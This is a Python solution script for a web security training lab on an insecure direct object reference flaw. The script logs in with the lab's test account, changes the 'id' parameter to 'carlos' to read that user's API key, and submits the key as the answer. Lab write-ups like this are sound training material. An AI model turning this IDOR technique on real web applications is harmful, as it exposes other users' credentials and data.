# User ID controlled by request parameter

> This lab has a horizontal privilege escalation vulnerability on the user account page.
> To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

BASE_URL = "https://0a5d00f603fa519b80090dbe008f0064.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Login Phase
    login_endpoint = url + "login"
    print(f"[*] Fetching CSRF token from: {login_endpoint}")
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']
    
    login_creds = {
        "username": "wiener",
        "password": "peter",
        "csrf": token
    }
    
    print("[*] Logging in as 'wiener'...")
    response = session.post(login_endpoint, data=login_creds)
    
    if "Log out" in response.text:
        print("[+] LOGIN SUCCESSFULL")
        
        # 2. Exploit Phase: IDOR
        # Access 'my-account' but request 'carlos' via the 'id' parameter
        account_endpoint = url + "my-account"
        target_payload = {
            "id": "carlos"
        }
        
        print(f"[*] Attempting IDOR to fetch API Key for 'carlos'...")
        response = session.get(account_endpoint, params=target_payload)
        
        # 3. Extraction Phase
        soup = BeautifulSoup(response.text, 'html.parser')
        # Extract the key text, split by colon, strip whitespace
        try:
            content_div = soup.find("div", id="account-content")
            # Usually format is "Your API Key is: xyz"
            apikey = content_div.find("div").text.split(":")[1].strip()
            print(f"[+] Found API Key: {apikey}")
            
            # 4. Submission Phase
            submit_endpoint = url + "submitSolution"
            answer = {
                "answer": apikey
            }
            print("[*] Submitting solution...")
            response = session.post(submit_endpoint, data=answer)
            
            if "true" in response.text or "Congratulations" in response.text:
                print("[+] SUCCESSFULL: Lab Solved.")
            else:
                print("[-] Submission failed.")
                
        except AttributeError:
            print("[-] Failed to extract API key. IDOR might have failed.")

if __name__ == "__main__":
    exploit(BASE_URL)
```